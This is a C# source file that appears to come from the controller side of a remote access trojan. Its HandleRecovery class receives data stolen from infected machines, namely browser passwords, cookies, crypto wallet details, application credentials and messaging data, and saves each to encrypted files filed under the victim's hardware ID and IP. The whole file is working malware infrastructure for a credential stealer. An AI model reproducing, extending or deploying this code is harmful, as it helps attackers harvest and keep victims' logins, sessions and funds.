using Server.MessagePack;
using Server.Connection;
using Server.Helper;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    public class HandleRecovery
    {
        public HandleRecovery(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Recovery");
                string timestamp = DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss");
                
                // Extract all data types
                string pass = unpack_msgpack.ForcePathObject("Logins").AsString;
                string cookies = unpack_msgpack.ForcePathObject("Cookies").AsString;
                string cryptoInfo = unpack_msgpack.ForcePathObject("CryptoInfo").AsString;
                string appCreds = unpack_msgpack.ForcePathObject("AppCredentials").AsString;
                string messaging = unpack_msgpack.ForcePathObject("MessagingData").AsString;
                
                bool hasData = false;
                
                if (!Directory.Exists(fullPath))
                    Directory.CreateDirectory(fullPath);
                
                // Save browser passwords (ENCRYPTED)
                if (!string.IsNullOrWhiteSpace(pass))
                {
                    string filePath = Path.Combine(fullPath, "Password_" + timestamp + ".enc");
                    if (EncryptionAtRest.EncryptToFile(pass.Replace("\n", Environment.NewLine), filePath))
                    {
                        hasData = true;
                        Logger.Log($"[HandleRecovery] Encrypted password file saved: {filePath}", Logger.LogLevel.Info);
                    }
                }
                
                // Save browser cookies (ENCRYPTED)
                if (!string.IsNullOrWhiteSpace(cookies))
                {
                    string filePath = Path.Combine(fullPath, "Cookies_" + timestamp + ".enc");
                    if (EncryptionAtRest.EncryptToFile(cookies, filePath))
                    {
                        hasData = true;
                        Logger.Log($"[HandleRecovery] Encrypted cookies file saved: {filePath}", Logger.LogLevel.Info);
                    }
                }
                
                // Save crypto wallet info (ENCRYPTED)
                if (!string.IsNullOrWhiteSpace(cryptoInfo))
                {
                    string filePath = Path.Combine(fullPath, "CryptoWallets_" + timestamp + ".enc");
                    if (EncryptionAtRest.EncryptToFile(cryptoInfo.Replace("\n", Environment.NewLine), filePath))
                    {
                        hasData = true;
                        Logger.Log($"[HandleRecovery] Encrypted crypto wallet file saved: {filePath}", Logger.LogLevel.Info);
                    }
                }
                
                // Save app credentials (ENCRYPTED)
                if (!string.IsNullOrWhiteSpace(appCreds))
                {
                    string filePath = Path.Combine(fullPath, "AppCredentials_" + timestamp + ".enc");
                    if (EncryptionAtRest.EncryptToFile(appCreds.Replace("\n", Environment.NewLine), filePath))
                    {
                        hasData = true;
                        Logger.Log($"[HandleRecovery] Encrypted app credentials file saved: {filePath}", Logger.LogLevel.Info);
                    }
                }
                
                // Save messaging data (ENCRYPTED)
                if (!string.IsNullOrWhiteSpace(messaging))
                {
                    string filePath = Path.Combine(fullPath, "MessagingData_" + timestamp + ".enc");
                    if (EncryptionAtRest.EncryptToFile(messaging.Replace("\n", Environment.NewLine), filePath))
                    {
                        hasData = true;
                        Logger.Log($"[HandleRecovery] Encrypted messaging data file saved: {filePath}", Logger.LogLevel.Info);
                    }
                }
                
                if (hasData)
                {
                    new HandleLogs().Addmsg($"Client {client.Ip} recovery completed successfully. Files saved to: ClientsFolder\\{unpack_msgpack.ForcePathObject("Hwid").AsString}\\Recovery", Color.Purple);
                }
                else
                {
                    new HandleLogs().Addmsg($"Client {client.Ip} recovery completed but no data found", Color.MediumPurple);
                }
                
                client?.Disconnected();
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg($"Recovery error: {ex.Message}", Color.Red);
            }
        }
    }
}